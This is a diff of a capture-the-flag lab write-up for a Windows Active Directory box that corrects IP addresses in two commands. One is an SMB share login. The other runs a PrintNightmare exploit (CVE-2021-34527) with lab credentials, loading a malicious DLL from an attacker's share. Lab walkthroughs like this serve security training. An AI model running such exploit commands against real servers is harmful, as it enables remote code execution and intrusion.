@@ -350,7 +350,7 @@ SMB         10.10.32.0      445    VULNNET-BC3TCK1  SYSVOL          READ        
 We got the `Enterprise-Share` on here, let's check it up:
 
 ```
-smbclient \\\\0.10.228.252\\Enterprise-Share -U 'enterprise-security'
+smbclient \\\\10.10.228.252\\Enterprise-Share -U 'enterprise-security'
 Password for [WORKGROUP\enterprise-security]:
 Try "help" to get a list of possible commands.
 smb: \> ls
@@ -603,7 +603,7 @@ run
 And finally, its time to use our exploit, let's do it:
 
 ```python
-python3 CVE-2021-34527.py vulnnet.local/enterprise-security:"sand_0873959498"@10.10.113.31 '\\10.14.21.28\share\evil.dll'
+python3 CVE-2021-34527.py vulnnet.local/enterprise-security:"sand_0873959498"@10.10.228.252 '\\10.14.21.28\share\evil.dll'
 ```
 
 ![Pasted image 20250715182627.png](../../IMAGES/Pasted%20image%2020250715182627.png)
